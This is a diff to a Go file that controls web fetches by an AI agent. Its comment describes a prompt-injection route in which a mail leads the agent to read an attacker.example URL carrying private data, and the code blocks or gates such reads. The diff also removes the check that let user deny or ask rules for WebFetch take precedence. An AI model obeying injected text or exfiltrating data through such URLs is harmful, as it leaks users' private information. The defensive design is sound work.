@@ -13,9 +13,8 @@ import (
 )
 
 // The brain's web, as decided in the study "Recherche web du cerveau"
-// (2026-10-27). It searches with its harness's own search (Claude Code's
-// WebSearch is allowed in advance; Codex is held to its cached index by the
-// node; OpenCode has none). It reads a page with its harness's reader, and
+// (2026-10-27). It searches with its harness's own search (Codex is held to
+// its cached index by the node; OpenCode has none). It reads a page with its harness's reader, and
 // every read comes here, since a URL is also a way out: a brain talked into
 // it by a mail could "read" https://attacker.example/?q=<something private>.
 //
@@ -23,8 +22,7 @@ import (
 //     (localhost, a private or loopback IP, a name without a dot), is refused:
 //     the node's egress relay enforces it for every task, this is defence in
 //     depth;
-//   - a rule of mine about WebFetch that denies or asks wins;
-//   - on a clean turn, the read is free;
+//   - on a clean turn, the read goes by the web's value (Settings → Tools);
 //   - on a tainted turn, it is mine to decide on a card, which never holds
 //     the brain; a yes lets it read that page once. The URL written in my own
 //     message of this turn is free: I chose it, the brain added nothing to it.
@@ -66,21 +64,6 @@ func (c *core) brainFetch(ctx context.Context, t *TaskRow, pid string, input map
 		log.Printf("brain: WebFetch %s refused: %s", truncate(raw, 200), why)
 		no := false
 		_, err := c.answer(ctx, t.ID, pid, "Refusé par la politique d'Eriphe : "+why+".", &no, byPolicy)
-		return err
-	}
-	switch decision, reason := c.decide(webFetchTool, input); decision {
-	case decideDeny:
-		log.Printf("brain: WebFetch %s refused by a rule: %s", truncate(raw, 200), reason)
-		no := false
-		_, err := c.answer(ctx, t.ID, pid, "Refusé par la politique d'Eriphe : "+reason+".", &no, byPolicy)
-		return err
-	case decideAsk:
-		if !c.usePageYes(raw) {
-			return c.brainFetchAsk(ctx, t, pid, raw, input, pending)
-		}
-		log.Printf("brain: WebFetch %s allowed: the user said yes on its card", truncate(raw, 200))
-		yes := true
-		_, err := c.answer(ctx, t.ID, pid, "", &yes, byPolicy)
 		return err
 	}
 	value := c.webValue()
